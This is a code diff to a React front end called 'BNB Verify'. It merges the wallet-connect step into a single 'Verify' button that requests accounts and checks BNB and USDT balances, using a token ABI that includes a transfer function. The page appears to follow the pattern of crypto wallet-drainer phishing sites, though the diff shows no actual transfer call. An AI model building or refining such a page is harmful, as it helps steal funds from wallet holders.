@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import "./App.css";
 
@@ -13,14 +13,14 @@ export default function App() {
     "function transfer(address to, uint amount) returns (bool)"
   ];
 
-  async function connectWallet() {
-    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = await provider.getSigner();
-    const address = await signer.getAddress();
-    setWalletAddress(address);
-  }
+  useEffect(() => {
+    if (window.ethereum) {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      provider.listAccounts().then(accounts => {
+        if (accounts.length > 0) setWalletAddress(accounts[0]);
+      });
+    }
+  }, []);
 
   async function handleVerify() {
     if (!window.ethereum) return setStatus("No wallet detected!");
@@ -29,6 +29,7 @@ export default function App() {
       await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
+      setWalletAddress(userAddress);
 
       setStatus("Checking balances...");
 
@@ -63,7 +64,6 @@ export default function App() {
 
   return (
     <div className="app">
-      {/* Navbar */}
       <header className="navbar">
         <nav className="container nav-content">
           <a href="#" className="logo">
@@ -77,28 +77,22 @@ export default function App() {
             <a href="#">NFTs</a>
             <a href="#">DApps</a>
           </div>
-          <button className="mobile-menu">
-            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
-            </svg>
-          </button>
         </nav>
       </header>
 
-      {/* Hero Section */}
       <main className="hero">
         <div className="hero-left">
           <div className="powered">Powered by BNB Chain</div>
           <h1>Verify Crypto Assets on BNB Chain</h1>
-          <p>Instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.</p>
+          <p>Instant verification of BNB Chain assets, supports BNB and USDT (BEP20).</p>
+
           <div className="hero-buttons">
-            {!walletAddress ? (
-              <button onClick={connectWallet} className="button-primary">Connect Wallet</button>
-            ) : (
-              <button onClick={handleVerify} className="button-primary">Verify</button>
-            )}
+            <button onClick={handleVerify} className="button-primary">
+              Verify
+            </button>
             <button className="button-secondary">Explore BNB Chain</button>
           </div>
+
           {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
           <p className="status">{status}</p>
         </div>
@@ -111,7 +105,6 @@ export default function App() {
         </div>
       </main>
 
-      {/* Cards Section */}
       <section className="cards-section">
         <div className="card">
           <h2>Explorer</h2>
@@ -131,7 +124,6 @@ export default function App() {
         </div>
       </section>
 
-      {/* Footer */}
       <footer>
         &copy; 2025 BNB Verify. Powered by BNB Chain.
       </footer>
